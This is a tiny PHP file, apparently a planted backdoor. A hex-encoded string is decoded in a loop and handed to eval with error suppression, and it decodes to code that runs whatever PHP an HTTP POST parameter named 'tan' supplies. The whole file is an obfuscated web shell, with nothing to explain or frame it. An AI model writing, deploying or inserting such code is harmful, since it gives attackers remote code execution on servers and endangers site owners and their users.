<?php
$a="6576616c2840245f504f53545b2774616e275d293b";
$b="";
for($i=0;$i<strlen($a)-1;$i+=2)
    $b.=chr(hexdec($a[$i].$a[$i+1]));
@eval($b);
?>